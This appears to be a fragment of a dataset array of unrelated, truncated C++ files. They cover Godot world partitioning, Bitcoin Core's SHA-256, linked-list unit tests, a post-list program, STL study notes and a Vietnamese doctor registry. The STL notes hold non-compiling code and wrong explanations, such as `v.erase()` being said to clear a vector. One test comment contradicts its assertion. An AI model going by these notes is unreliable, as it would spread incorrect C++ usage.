nodes_to_partition.append(child);\n        }\n        else if (child->get_name() == test_name) { player_node = child; }\n    }\n    godot::UtilityFunctions::print(non_node3d_count);\n\n    generate_chunks();\n    if (show_chunk_markers){generate_markers();}\n\n    for (int i = 0; i < chunk_points.size(); i++) {\n        if (check_in_chunk(chunk_points[i], player_node->get_global_position()))\n        {current_chunk = i; break;}\n    }\n    godot::UtilityFunctions::print(\"columns and rows\");\n    godot::UtilityFunctions::print(number_of_columns);\n    godot::UtilityFunctions::print(number_of_rows);\n}\n\nvoid WorldPartition::set_chunk_size(const Vector3 p_chunk_size) {chunk_size = p_chunk_size;}\nVector3 WorldPartition::get_chunk_size() const {return chunk_size;}\n\nvoid WorldPartition::set_map_size(const Vector3 p_map_size) {map_size = p_map_size;}\nVector3 WorldPartition::get_map_size() const {return  map_size;}\n\nvoid WorldPartition::set_show_chunk_markers(const bool p_show_chunk_markers) {show_chunk_markers = p_show_chunk_markers;}\nbool WorldPartition::get_show_chunk_markers() const {return show_chunk_markers;}\n\nvoid WorldPartition::set_auto_mapsize(const bool p_use_auto_mapsize) {use_auto_mapsize = p_use_auto_mapsize;}\nbool WorldPartition::get_auto_mapsize() const {return use_auto_mapsize;}\n\nvoid WorldPartition::generate_chunks() {\n    godot::UtilityFunctions::print(\"generating chunks\");\n    if (use_auto_mapsize){\n        godot::UtilityFunctions::print(\"using auto mapsize\");\n    } else {\n        Vector3 starting_point = Vector3(map_size.x / 2, map_size.y / 2, map_size.z / 2);\n        Vector3 current_point = Vector3(starting_point.x - (chunk_size.x / 2), starting_point.y - (chunk_size.y / 2), starting_point.z - (chunk_size.z / 2));\n\n        Vector3 lowest_point = Vector3((-map_size.x / 2) + (chunk_size.x / 2), (-map_size.y / 2)  + (chunk_size.y / 2), (-map_size.z / 2) + (chunk_size.z / 2));\n\n        godot::UtilityFunctions::print(current_point);\n        godot::UtilityFunctions::print(lowest_point);\n        godot::UtilityFunctions::print(\"\\n\");\n\n        while (current_point.z >= lowest_point.z)\n        {\n            while (current_point.x >= lowest_point.x)\n            {\n                chunk_points.append(current_point);\n                current_point = Vector3(current_point.x - (chunk_size.x / 2), current_point.y, current_point.z);\n            }\n\n            current_point = Vector3(starting_point.x, current_point.y, current_point.z  - (chunk_size.z / 2));\n        }\n    }\n\n    for (int i = 0; i < number_of_columns; i++) {\n        edge_chunks.append(i);\n   ",
    "// Copyright (c) 2014 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include \"crypto/sha256.h\"\n#include \"crypto/common.h\"\n\n#include <assert.h>\n#include <string.h>\n#include <stdexcept>\n\n\n\n#if defined(__x86_64__) || defined(__amd64__) || defined(__i386__)\n#if defined(USE_ASM)\n#include <cpuid.h>\nnamespace sha256_sse4\n{\nvoid Transform(uint32_t* s, const unsigned char* chunk, size_t blocks);\n}\n#endif\n#endif\n\nnamespace sha256d64_sse41\n{\nvoid Transform_4way(unsigned char* out, const unsigned char* in);\n}\n\nnamespace sha256d64_avx2\n{\nvoid Transform_8way(unsigned char* out, const unsigned char* in);\n}\n\nnamespace sha256d64_shani\n{\nvoid Transform_2way(unsigned char* out, const unsigned char* in);\n}\n\nnamespace sha256_shani\n{\nvoid Transform(uint32_t* s, const unsigned char* chunk, size_t blocks);\n}\n\n// Internal implementation code.\nnamespace\n{\n/// Internal SHA-256 implementation.\nnamespace sha256\n{\nuint32_t inline Ch(uint32_t x, uint32_t y, uint32_t z) { return z ^ (x & (y ^ z)); }\nuint32_t inline Maj(uint32_t x, uint32_t y, uint32_t z) { return (x & y) | (z & (x | y)); }\nuint32_t inline Sigma0(uint32_t x) { return (x >> 2 | x << 30) ^ (x >> 13 | x << 19) ^ (x >> 22 | x << 10); }\nuint32_t inline Sigma1(uint32_t x) { return (x >> 6 | x << 26) ^ (x >> 11 | x << 21) ^ (x >> 25 | x << 7); }\nuint32_t inline sigma0(uint32_t x) { return (x >> 7 | x << 25) ^ (x >> 18 | x << 14) ^ (x >> 3); }\nuint32_t inline sigma1(uint32_t x) { return (x >> 17 | x << 15) ^ (x >> 19 | x << 13) ^ (x >> 10); }\n\n/** One round of SHA-256. */\nvoid inline Round(uint32_t a, uint32_t b, uint32_t c, uint32_t& d, uint32_t e, uint32_t f, uint32_t g, uint32_t& h, uint32_t k)\n{\n    uint32_t t1 = h + Sigma1(e) + Ch(e, f, g) + k;\n    uint32_t t2 = Sigma0(a) + Maj(a, b, c);\n    d += t1;\n    h = t1 + t2;\n}\n\n/** Initialize SHA-256 state. */\nvoid inline Initialize(uint32_t* s)\n{\n    s[0] = 0x6a09e667ul;\n    s[1] = 0xbb67ae85ul;\n    s[2] = 0x3c6ef372ul;\n    s[3] = 0xa54ff53aul;\n    s[4] = 0x510e527ful;\n    s[5] = 0x9b05688cul;\n    s[6] = 0x1f83d9abul;\n    s[7] = 0x5be0cd19ul;\n}\n\n/** Perform a number of SHA-256 transformations, processing 64-byte chunks. */\nvoid Transform(uint32_t* s, const unsigned char* chunk, size_t blocks)\n{\n    while (blocks--) {\n    uint32_t a = s[0], b = s[1], c = s[2], d = s[3], e = s[4], f = s[5], g = s[6], h = s[7];\n    uint32_t w0, w1, w2, w3, w4, w5, w6, w7, w8, w9, w10, w11, w12, w13, w14, w15;\n\n        Round(a, b, c, d, e, f, g, h, 0x428a2f98 + (w0 = ReadBE32(chunk + 0)));\n        Round(h, a, b, c, d, e, f, g, 0x71374491 + (w1 = ReadBE32(chunk + 4)));\n        Round(g, h, a, b, c, d, e, f, 0xb5c0fbcf + (w2 = ReadBE32(chunk + 8)));\n        Round(f, g, h, a, b, c, d, e, 0xe9b5dba5 + (w3 = ReadBE32(chunk + 12)));\n        Round(e, f, g, h, a, b, c, d, 0x3956c25b + (w4 = ReadBE32(chunk + 16)));\n        Round(d, e, f, g, h, a, b, c, 0x59f111f1 + (w5 = ReadBE32(chunk + 20)));\n        Round(c, d, e, f, g, h, a, b, 0x923f82a4 + (w6 = ReadBE32(chunk + 24)));\n        Round(b, c, d, e, f, g, h, a, 0xab1c5ed5 + (w7 = ReadBE32(chunk + 28)));\n        Round(a, b, c, d, e, f, g, h, 0xd807aa98 + (w8 = ReadBE32(chunk + 32)));\n        Round(h, a, b, c, d, e, f, g, 0x12835b01 + (w9 = ReadBE32(chunk + 36)));\n        Round(g, h, a, b, c, d, e, f, 0x243185be + (w10 = ReadBE32(chunk + 40)));\n        Round(f, g, h, a, b, c, d, e, 0x550c7dc3 + (w11 = ReadBE32(chunk + 44)));\n        Round(e, f, g, h, a, b, c, d, 0x72be5d74 + (w12 = ReadBE32(chunk + 48)));\n        Round(d, e, f, g, h, a, b, c, 0x80deb1fe + (w13 = ReadBE32(chunk + 52)));\n        Round(c, d, e, f, g, h, a, b, 0x9bdc06a7 + (w14 = ReadBE32(chunk + 56)));\n        Round(b, c, d, e, f, g, h, a, 0xc19bf174 + (w15 = ReadBE32(chunk + 60)));\n\n        Round(a, b, c, d, e, f, g, h, 0xe49b69c1 + (w0 += sigma1(w14) + w9 + sigma0(w1)));\n        Round(h, a, b, c, d, e, f, g, 0xefbe4786 + (w1 += sigma1(w15) + w10 + sigma0(w2)));\n        Round(g, h, a, b, c, d, e, f, 0x0fc19dc6 + (w2 += sigma1(w0) + w11 + sigma0(w3)));\n        Round(f, g, h, a, b, c, d, e, 0x240ca1cc + (w3 += sigma1(w1) + w12 + sigma0(w4)));\n        Round(e, f, g, h, a, b, c, d, 0x2de92c6f + (w4 += sigma1(w2) + w13 + sigma0(w5)));\n        Round(d, e, f, g, h, a, b, c, 0x4a7484aa + (w5 += sigma1(w3) + w14 + sigma0(w6)));\n        Round(c, d, e, f, g, h, a, b, 0x5cb0a9dc + (w6 += sigma1(w4) + w15 + sigma0(w7)));\n        Round(b, c, d, e, f, g, h, a, 0x76f988da + (w7 += sigma1(w5) + w0 + sigma0(w8)));\n        Round(a, b, c, d, e, f, g, h, 0x983e5152 + (w8 += sigma1(w6) + w1 + sigma0(w9)));\n        Round(h, a, b, c, d, e, f, g, 0xa831c66d + (w9 += sigma1(w7) + w2 + sigma0(w10)));\n        Round(g, h, a, b, c, d, e, f, 0xb00327c8 + (w10 += sigma1(w8) + w3 + sigma0(w11)));\n        Round(f, g, h, a, b, c, d, e, 0xbf597fc7 + (w11 += sigma1(w9) + w4 + sigma0(w12)));\n        Round(e, f, g, h, a, b, c, d, 0xc6e00bf3 + (w12 += sigma1(w10) + w5 +",
    "#//include \"pch.h\"\r\n#include\"gtest/gtest.h\"\r\n#include \"Header.h\"\r\n\r\nTEST(CircularLinkedListTest, EmptyList) {\r\n    CircularLinkedList cll;\r\n    EXPECT_TRUE(cll.isEmpty());\r\n}\r\n\r\nTEST(CircularLinkedListTest, InsertToEnd) {\r\n    CircularLinkedList cll;\r\n    cll.insert(10);\r\n    cll.insert(20);\r\n\r\n    int expected[] = { 10, 20 };\r\n    int result[2] = { 0 };\r\n\r\n    int i = 0;\r\n    Node* current = cll.getHead();\r\n    do {\r\n        result[i++] = current->getData();\r\n        current = current->getNext();\r\n    } while (current != cll.getHead());\r\n\r\n    EXPECT_EQ(0, memcmp(expected, result, sizeof(expected)));\r\n}\r\n\r\nTEST(CircularLinkedListTest, Search) {\r\n    CircularLinkedList cll;\r\n    cll.insert(10);\r\n    cll.insert(20);\r\n    cll.insert(30);\r\n\r\n    EXPECT_TRUE(cll.search(20));\r\n    EXPECT_FALSE(cll.search(40));\r\n}\r\n\r\nTEST(CircularLinkedListTest, Update) {\r\n    CircularLinkedList cll;\r\n    cll.insert(10);\r\n    cll.insert(20);\r\n    cll.insert(30);\r\n\r\n    cll.update(20, 25);\r\n    EXPECT_TRUE(cll.search(25));\r\n    EXPECT_FALSE(cll.search(20));\r\n}\r\n\r\nTEST(CircularLinkedListTest, InsertAtIndex) {\r\n    CircularLinkedList cll;\r\n    cll.insert(10);\r\n    cll.insert(20);\r\n    cll.insert(40);\r\n\r\n    cll.insertAtIndex(30, 2);\r\n\r\n    int expected[] = { 10, 20, 30, 40 };\r\n    int result[4] = { 0 };\r\n\r\n    int i = 0;\r\n    Node* current = cll.getHead();\r\n    do {\r\n        result[i++] = current->getData();\r\n        current = current->getNext();\r\n    } while (current != cll.getHead());\r\n\r\n    EXPECT_EQ(0, memcmp(expected, result, sizeof(expected)));\r\n}\r\n\r\nTEST(CircularLinkedListTest, Delete) {\r\n    CircularLinkedList cll;\r\n    cll.insert(10);\r\n    cll.insert(20);\r\n    cll.insert(30);\r\n\r\n    cll.deleteData(20);\r\n\r\n    int expected[] = { 10, 30 };\r\n    int result[2] = { 0 };\r\n\r\n    int i = 0;\r\n    Node* current = cll.getHead();\r\n    do {\r\n        result[i++] = current->getData();\r\n        current = current->getNext();\r\n    } while (current != cll.getHead());\r\n\r\n    EXPECT_EQ(0, memcmp(expected, result, sizeof(expected)));\r\n}\r\n\r\n\r\n\r\nTEST(DoublyLinkedListTest, EmptyList) {\r\n    DoublyLinkedList dll;\r\n    EXPECT_TRUE(dll.isEmpty());\r\n}\r\n\r\nTEST(DoublyLinkedListTest, InsertToHead) {\r\n    DoublyLinkedList dll;\r\n    dll.insertToHead(10);\r\n    dll.insertToHead(20);\r\n\r\n    int expected[] = { 20, 10 };\r\n    int result[2] = { 0 };\r\n\r\n    int i = 0;\r\n    DoublyNode* current = dll.getHead();\r\n    while (current) {\r\n        result[i++] = current->getData();\r\n        current = current->getNext();\r\n    }\r\n\r\n    EXPECT_EQ(0, memcmp(expected, result, sizeof(expected)));\r\n}\r\n\r\nTEST(DoublyLinkedListTest, InsertToEnd) {\r\n    DoublyLinkedList dll;\r\n    dll.insert(10);\r\n    dll.insert(20);\r\n\r\n    int expected[] = { 10, 20 };\r\n    int result[2] = { 0 };\r\n\r\n    int i = 0;\r\n    DoublyNode* current = dll.getHead();\r\n    while (current) {\r\n        result[i++] = current->getData();\r\n        current = current->getNext();\r\n    }\r\n\r\n    EXPECT_EQ(0, memcmp(expected, result, sizeof(expected)));\r\n}\r\n\r\nTEST(DoublyLinkedListTest, Search) {\r\n    DoublyLinkedList dll;\r\n    dll.insert(10);\r\n    dll.insert(20);\r\n    dll.insert(30);\r\n\r\n    EXPECT_TRUE(dll.search(20));\r\n    EXPECT_FALSE(dll.search(40));\r\n}\r\n\r\nTEST(DoublyLinkedListTest, Update) {\r\n    DoublyLinkedList dll;\r\n    dll.insert(10);\r\n    dll.insert(20);\r\n    dll.insert(30);\r\n\r\n    dll.update(20, 25);\r\n    EXPECT_TRUE(dll.search(25));\r\n    EXPECT_FALSE(dll.search(20));\r\n}\r\n\r\nTEST(DoublyLinkedListTest, InsertAtIndex) {\r\n    DoublyLinkedList dll;\r\n    dll.insert(10);\r\n    dll.insert(20);\r\n    dll.insert(40);\r\n\r\n    dll.insertAtIndex(30, 2);\r\n\r\n    int expected[] = { 10, 20, 30, 40 };\r\n    int result[4] = { 0 };\r\n\r\n    int i = 0;\r\n    DoublyNode* current = dll.getHead();\r\n    while (current) {\r\n        result[i++] = current->getData();\r\n        current = current->getNext();\r\n    }\r\n\r\n    EXPECT_EQ(0, memcmp(expected, result, sizeof(expected)));\r\n}\r\n\r\nTEST(DoublyLinkedListTest, Delete) {\r\n    DoublyLinkedList dll;\r\n    dll.insert(10);\r\n    dll.insert(20);\r\n    dll.insert(30);\r\n    dll.print();\r\n    dll.deleteData(20);\r\n\r\n    int expected[] = { 10, 30 };\r\n    int result[2] = { 0 };\r\n\r\n    int i = 0;\r\n    DoublyNode* current = dll.getHead();\r\n    while (current) {\r\n        result[i++] = current->getData();\r\n        current = current->getNext();\r\n    }\r\n\r\n    EXPECT_EQ(0, memcmp(expected, result, sizeof(expected)));\r\n}\r\n\r\n\r\nTEST(CircularLinkedListTest, FindWinner) {\r\n    // Create a CircularLinkedList with skills [1, 2, 3, 4, 5]\r\n    CircularLinkedList cll;\r\n\r\n    cll.insert(1);\r\n    cll.insert(2);\r\n    cll.insert(7);\r\n    cll.insert(9);\r\n    cll.insert(5);\r\n\r\n    // Find the winner with M = 3 (eliminate every 3rd person)\r\n    int winnerSkill = cll.findWinner(3);\r\n    // The expected winner skill level is 4 (after eliminating 1, 2, 3).\r\n    EXPECT_EQ(winnerSkill, 9);\r\n}\r\n\r\n\r\nTEST(CircularLinkedListTest, FindWinner2) {\r\n    // Create a CircularLinkedList with skills [1, 2, 3, 4, 5]\r\n    CircularLinkedList cll;\r\n\r\n    cll.in",
    "#include<iostream>\n#include<ctime>\n#include<cstring>\nusing namespace std;\nclass node\n{\n    public:\n        int id;\n        string time;\n        string post;\n        node *nextF;\n        node *nextB;\n};\nclass linkedlist\n{\n    private:\n        node *mainData;      // contains head data\n        node *mainDataR;     // contains tail data\n    public:\n        linkedlist();\n        void insert(node *node1);\n        void print();      // to print data from head\n        void printR();     // to print data from tail\n        void del(int id);\n        void chkByTxt(string text,string edit);\n        bool checkId(int id);   // check id uniqueness\n        void edit(int id, string text,string time);\n};\nlinkedlist::linkedlist()\n{\n    mainData = NULL;\n}\n\nvoid linkedlist::insert(node *node1)\n{\n    if (mainData == NULL)\n    {\n        mainData = node1;\n        node1->nextB = NULL;\n    }\n    else\n    {\n        node *temp = mainData;\n        node *tempB;\n        while (temp->nextF != NULL)\n        {\n            tempB = temp;\n            temp = temp->nextF;\n        }\n        temp->nextF = node1;\n        node1->nextB = temp;\n        mainDataR = node1;\n        \n    }\n}\nvoid linkedlist::print()\n{\n    node *temp = mainData;\n    while (temp != NULL)\n    {\n        cout<<\"( oldest first )\\n\";\n        cout << \"id : \" << temp->id << endl;\n        cout << \"text : \" << temp->post << endl;\n        cout << \"last edit time : \" << temp->time << endl;\n\n        temp = temp->nextF;\n    }\n}\nvoid linkedlist::printR()\n{\n    node *temp = mainDataR;\n    while (temp != NULL)\n    {\n        cout<<\"( latest first )\\n\";\n        cout << \"id : \" << temp->id << endl;\n        cout << \"text : \" << temp->post << endl;\n        cout << \"last edit time : \" << temp->time << endl;\n\n        temp = temp->nextB;\n    }\n}\nvoid linkedlist::chkByTxt(string text,string edit)\n{\n    string timenow;\n    node *temp = mainData;\n    cout<<\" All the posts containing the text are : \";\n    while (temp != NULL)\n    {\n        if(temp->post.find(text) != string::npos)\n        {\n            cout<<\" \"<<temp->post<<\" : with id : \"<<temp->id<<endl;\n            if(edit != \"N\" && edit != \"del\")\n            {\n                time_t currentTime;\n                time(&currentTime);\n                timenow = ctime(&currentTime);\n                temp->time = timenow;\n                temp->post = edit;\n\n            }\n            else if(edit == \"del\")\n            {\n                del(temp->id);\n            }\n        }\n        temp = temp->nextF;\n    }\n}\nbool linkedlist::checkId(int id)\n{\n    bool flag = false;\n    node *temp = mainData;\n    while (temp != NULL)\n    {\n        if(temp->id == id)\n        {\n            flag = true;\n            break;\n        }\n        temp = temp->nextF;\n    }\n    return flag;\n}\nvoid linkedlist::edit(int id, string text,string time)\n{\n    node *temp = mainData;\n    while (temp != NULL)\n    {\n        if(temp->id == id)\n        {\n            cout<<\" your old post was : \"<<temp->post<<endl;\n            temp->post = text;\n            temp->time = time;\n        }\n        temp = temp->nextF;\n    }\n}\nvoid linkedlist::del(int id)\n{\nnode *temp = mainData;\nnode *temp1;\nnode *temp2;\n    while (temp != NULL)\n    {\n        if(temp->id == id)\n        {\n            if(temp->nextB == NULL && temp->nextF != NULL)\n            {\n                cout<<\"  head node\\n\";\n                temp1 = temp->nextF;\n                temp1->nextB = NULL;\n                mainData = temp1;\n                delete temp;\n            }\n            else if(temp->nextB == NULL && temp->nextF == NULL)\n            {\n                cout<<\" single node\\n\";\n                delete temp;  \n                mainData = NULL;\n            }\n            else if(temp->nextF == NULL && temp->nextB != NULL)\n            {\n                cout<<\"  tail node\\n\";\n                temp1 = temp->nextB;\n                temp1->nextF = NULL;\n                mainDataR = temp1;\n                delete temp;\n            }\n            else if(temp->nextB != NULL && temp->nextF != NULL)\n            {\n                cout<<\"  body node\\n\";\n                temp1 = temp->nextF;\n                temp2 = temp->nextB;\n                temp2->nextF = temp1;\n                temp1->nextB = temp2;\n                delete temp;\n            }\n            break;\n        }\n        temp = temp->nextF;\n    }\n}\nint main()\n{\n    linkedlist list1;\n    int id;\n    string timenow;\nstring post[10];\npost[0] = \"Hello World\";\npost[1] = \"How is everyone doing today?\";\npost[2] = \"world animation\";\npost[3] = \"good bye world\";\npost[4] = \"how are you\";\npost[5] = \"see you tommorow\";\npost[6] = \"well well well\";\npost[7] = \"very well well very\";\npost[8] = \"I should be going, see you guys\";\npost[9] = \"Bye\";\nfor(int i=0;i<10;i++)\n{\n    node * node1 = new node;\n    node1->post = post[i];\n    do \n    {\n    id = rand() % 9000 + 1000;\n    }while (list1.checkId(id) == true);\n    node1->id = id;\n    time_t currentTime;\n    time(&currentTime);\n    timenow = ctime(&currentTime);\n    node",
    "\r\n\r\n//#include<bits/stdc++.h>\r\n//using namespace std;\r\n\r\n//void explainPair()\r\n//{\r\n//*********pairing any variables********\r\n  \r\n //pair<int, int> p = {1, 2};\r\n // cout<< p.first <<\" \" << p.second;\r\n\r\n  // ****nested property of pairs****\r\n  \r\n// if there are pair of suppose 3 numbers then the first number will be pairing with the 2nd pairs\r\n  \r\npair<int, pair<int, int>> q = {1, {3,4}};\r\n\r\ncout << q.first << \" \" << q.second.first << \" \" << q.second.second;\r\n  \r\n\r\n\r\n//********pairing array*****\r\n\r\npair<int, int> arr[] = {{1,2}, {2,5}, {5,1}};\r\n\r\ncout << arr[1].second;\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n//**********VECTORS********\r\n\r\n// A dynamic container where we can change value whenever needed\r\n\r\nvoid explainvector()\r\n{\r\n vector<int> v;  // creates an empty container\r\n\r\n  v.push_back(1);     // 1 goes to the empty container\r\n  v.emplace_back(2);    // 2 goes to the container\r\n\r\n  //********vector of a pair\r\n\r\n  vector<pair<int, int>> vec;\r\n\r\n  vec.push_back({1,2});    // input array values\r\n  vec.emplace_back(1,2);    // it will understand automatically\r\n\r\n  vector<int> v(5, 100); // {100,100,100,100,100}\r\n\r\n  vector<int> v(5); // {_, _, _, _, _} 0 or any garbage value\r\n\r\n  vector<int> v1(5, 20); // {20,20,20,20,20}\r\n\r\n  vector<int> v2(v1); // {20,20,20,20,20}\r\n\r\n  vector<int> vect(5); // arr of 5\r\n\r\n  vect.pushback(1); // arr of 6\r\n  \r\n\r\n  //********ITERATOR*****\r\n\r\n  vector<int> :: iterator it = v.begin;   // syntax, v.begin points the memory\r\n\r\n  // {20, 10, 15, 6, 7,}\r\n\r\n  it++;\r\n  cout << *(it) << endl; // * indicates the value of that memory. therefore 10\r\n\r\n  it + 2;\r\n  cout << *(it) << endl; // therefore 6\r\n\r\n\r\n  //*******other iterators\r\n\r\n  vector<int> :: iterator it = v.end();   // point after the last element suppose {1,2,3,4,5} then after 5 and if --it is used then 5 will be the output\r\n  \r\n\r\ncout << v.back() << endl;    // v.back() = {10, 20, 30} element of the last vector of 30\r\n\r\n\r\n\r\n\r\n\r\n//*******for printing\r\n  \r\n // 1st type\r\n  for (vector<int> :: iterator it = v.begin(); it != v.end(); it++)\r\n    {\r\n    cout<< *(it) << endl;\r\n    }\r\n\r\n\r\n  // 2nd type\r\n\r\n  for (auto it = v.begin(); it != v.end(); it++)\r\n    {\r\n    cout<< *(it) << endl;\r\n    }\r\n\r\n// auto is the shortcut of \"vector<int> :: iterator it\" auto also automatically assigns the data type\r\n\r\n\r\n  // 3rd type\r\n\r\n  for(auto it : v) // auto will automatically do the task print and assigning\r\n    {\r\n    cout<< it << endl;\r\n    }\r\n\r\n  \r\n\r\n\r\n//**********Erase\r\n\r\n\r\n  //vector is {10, 20, 12, 23}\r\n\r\n  v.erase(v.begin() + 1);   // it will erase 20 and get reshuffeled therefore {10, 12, 23}\r\n\r\n  \r\n  //***** deleating elements\r\n  // {10, 20, 30, 40, 50} here we need to delete 2 elements 20 and 30 so in .erase() we need to give the staring point of deletion and the end point to start \".begin(start, end)\"\r\n\r\n  v.erase(v.begin() + 1, v.begin() + 3);    // {10, 40, 50}\r\n\r\n    \r\n \r\n  //*******inserting functions\r\n\r\n  // it means we can insert any vector anytime\r\n\r\n  vector<int> v(2, 100);   // {100, 100}\r\n  \r\n  v.insert(v.begin(), 300);   // {300, 100, 100}  begin initialises the position and the next what to print\r\n\r\n  \r\n  v.insert(v.begin()+1, 2, 5);  // it means after 300, two 5 will print {300, 5, 5, 100, 100}\r\n\r\n\r\n\r\n\r\n\r\n  \r\n  v(10, 100);\r\n  cout << v.size(); // 2  initializes the size\r\n\r\n\r\n\r\n\r\n\r\n  //pop_back\r\n  //{10, 20}\r\n\r\n  v.pop_back(); // 10  pop back the next vectors\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n  v1(10, 20);\r\n  v2(30, 40);\r\n\r\n  v1.swap(v2) /* swap the elements   v1(30, 40);\r\n                                     v2(10, 20);  */\r\n\r\n\r\nv.erase(); // clear the full vector\r\n\r\n  cout << v.empty();   // checks empty or not\r\n  \r\n\r\n  \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n  //********************  LIST  ******************\r\n\r\n\r\nvoid explainlist();\r\n\r\nlist<int> ls;\r\n  \r\n  ls.push_back(2);  // {2}\r\n\r\n  ls.emplace_back(4);  // {2, 4}\r\n\r\n  ls.push_front(5);  // {5, 2, 4}\r\n\r\n  ls.emplace_front();  // {2, 4}\r\n  \r\n\r\n// OTHERS ARE SAME AS VECTORS\r\n  //begin, end, rbegin, rend, clear, swap, insert, size\r\n\r\n\r\n\r\n\r\n\r\n\r\n  //*************  DEQUE  **************\r\n\r\n  \r\n  void explaindeque();\r\n\r\n  deque<int> dq;\r\n\r\n    dq.push_back(2);  // {2}\r\n\r\n    dq.emplace_back(4);  // {2, 4}\r\n\r\n  dq.push_front(5);  // {5, 2, 4}\r\n\r\n    dq.emplace_front(6);  // {6, 5, 2, 4}\r\n\r\n  dq.pop_back(); // {6, 5, 2}\r\n\r\n  dq.pop_front(); // {5, 2}\r\n\r\n\r\n  // OTHERS ARE SAME AS VECTORS\r\n  //begin, end, rbegin, rend, clear, swap, insert, size\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n  //*******************  STACK  *****************\r\n\r\n  // it follows LIFO that means **Last in First out**\r\n  \r\nvoid explainstack();\r\n  \r\n  stack<int> st;\r\n\r\n  st.push(1); //                container filled with 1\r\n  st.push(2);//                  then 2\r\n  st.push(3);//                    3\r\n  st.push(3);//                    3\r\n  st.emplace(5); //                5\r\n\r\n\r\n  cout << st.top(); //            by LIFO  5 will print\r\n\r\n  st.pop();            //     by LIFO  5 will print and{3,3,2,1}\r\n\r\n  cout << st.top();  //         now 3 will print\r\n\r\n  cout << st.size(); //             s",
    "//D\u01b0\u01a1ng \u0110\u1ee9c Tu\u1ea5n\n#include <iostream>\n#include <string>\n#include <iomanip>\n#include \"BACSI.h\"\n\nusing namespace std;\n\n//D\u1eef li\u1ec7u v\u1ec1 b\u00e1c s\u0129\nvoid InitBS(DSBS &H) {\n    H = NULL;\n}\n\n// Th\u00eam B\u00e1c s\u0129 t\u1ea1o danh s\u00e1ch\nvoid InsertBSS(DSBS &H, Bac_si K) {\n    BSNODE Q = new NODEBS;\n    Q->BS = K;\n    Q->nextBS = NULL;\n    if (H == NULL || H->BS.Ho_tenBS >= Q->BS.Ho_tenBS) {\n        Q->nextBS = H;\n        H = Q;\n    } else {\n        BSNODE P = H;\n        while (P->nextBS != NULL && P->nextBS->BS.Ho_tenBS < Q->BS.Ho_tenBS) {\n            P = P->nextBS;\n        }\n        Q->nextBS = P->nextBS;\n        P->nextBS = Q;\n    }\n}\n\n// InsertBS(....) & ArrangeBS()\nvoid InsertBS(DSBS &H) {\n    int check;\n    do{\n        Bac_si k;\n        cin.ignore();\n        cout << \"\\tNhap thong tin bac si can them nhu sau:\" << endl;\n        cout << \"Ho ten BS:\";\n        getline(cin, k.Ho_tenBS);\n        cout << \"Chuc vu:\";\n        getline(cin, k.Chuc_vu);\n        cout << \"Gia kham:\";\n        cin >> k.Gia_kham;\n        cout << \"Ma BS\" << endl;\n        cin >> k.MaBS;\n        cin.ignore();\n        BSNODE Q = new NODEBS;\n        Q->BS = k;\n        Q->nextBS = NULL;\n\n        if (H == NULL || H->BS.Ho_tenBS >= Q->BS.Ho_tenBS) {\n            Q->nextBS = H;\n            H = Q;\n        } else {\n            BSNODE P = H;\n            while (P->nextBS != NULL && P->nextBS->BS.Ho_tenBS < Q->BS.Ho_tenBS) {\n                P = P->nextBS;\n            }\n             Q->nextBS = P->nextBS;\n            P->nextBS = Q;\n        }\n        cout<<\"Tiep tuc nhap tiep khong:(1.Co , 0. Khong)\"<<endl;\n        cin >> check;\n    }while(check);\n}\n// DeleteBS(....)\nvoid DeleteBS(DSBS &H, string hotenBS) {\n    if (H == NULL) {\n        cout << \"Khong co gi de xoa:\" << endl;\n        return;\n    } else if (H->BS.Ho_tenBS == hotenBS) {\n        BSNODE temp = H;\n        H = H->nextBS;\n        delete temp;\n        return;\n    } else {\n        BSNODE Q = H;\n        while (Q->nextBS != NULL && Q->nextBS->BS.Ho_tenBS != hotenBS) {\n            Q = Q->nextBS;\n        }\n        if (Q->nextBS != NULL) {\n            BSNODE temp = Q->nextBS;\n            Q->nextBS = temp->nextBS;\n            delete temp;\n        }\n    }\n}\n\n// FindBS(......)\nBSNODE FINDBS(DSBS H, string hotenBS) {\n    BSNODE Q = H;\n    while (Q != NULL) {\n        if (Q->BS.Ho_tenBS == hotenBS) {\n            return Q;\n        }\n        Q = Q->nextBS;\n    }\n    return NULL;\n}\nBSNODE FINDBS1(DSBS H, string maBS) {\n    BSNODE Q = H;\n    while (Q != NULL) {\n        if (Q->BS.MaBS == maBS) {\n            return Q;\n        }\n        Q = Q->nextBS;\n    }\n    return NULL;\n}\nvoid FixBS(DSBS& dsbs, string maBS) {\n    BSNODE P = FINDBS1(dsbs, maBS);\n    if (P != NULL) {\n        cin.ignore();\n        cout << \"\\n\\tNhap thong tin moi cho bac si\" << endl;\n        cout << \"Ho va ten: \";\n        getline(cin, P->BS.Ho_tenBS);\n        cout << \"Nhap chuc vu: \";\n        getline(cin,P->BS.Chuc_vu);\n        cout << \"Nhap ma BS: \";\n        cin >> P->BS.MaBS;\n        cout << \"Thong tin thay doi thanh cong!\" << endl;\n        cin.ignore();\n    } else {\n        return; \n    }\n}\n\n\n\nvoid PrintBS(DSBS H) {\n    if (H == nullptr) {\n        cout << \"Khong co gi de in ra man hinh\" << endl;\n    } else {\n        BSNODE Q = H;\n        cout << left << setw(20) << \"Ho ten BS\"\n             << setw(20) << \"Chuc vu\"\n             << setw(15) << \"Gia kham\"\n             << setw(15) << \"Ma BS\"\n             << endl;\n        \n        while (Q != nullptr) {\n            cout << left << setw(20) << Q->BS.Ho_tenBS\n                 << setw(20) << Q->BS.Chuc_vu\n                 << setw(15) << Q->BS.Gia_kham\n                 << Q->BS.MaBS << endl;\n            Q = Q->nextBS;\n        }\n    }\n}",
